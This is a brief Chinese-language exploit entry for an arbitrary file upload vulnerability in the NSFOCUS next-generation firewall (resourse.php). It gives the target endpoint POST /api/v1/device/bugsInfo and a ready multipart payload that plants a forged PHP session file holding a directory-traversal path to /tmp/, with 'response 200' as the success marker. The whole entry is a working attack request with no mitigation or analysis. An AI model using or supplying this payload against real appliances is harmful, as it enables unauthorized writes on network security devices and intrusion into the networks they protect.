# 绿盟下一代防火墙resourse.php任意文件上传漏洞

绿盟下一代防火墙resourse.php ｜ 文件上传 ｜ —
- **请求**：`POST /api/v1/device/bugsInfo HTTP/1.1`

**Payload**
```
--1d52ba2a11ad8a915eddab1a0e85acd9
Content-Disposition: form-data; name="file"; filename="sess_82c13f359d0dd8f51c29d658a9c8ac71"
langs:52:"../../../../../../../../../../../../../../../../tmp/";
--1d52ba2a11ad8a915eddab1a0e85acd9--
```
- **响应特征**：200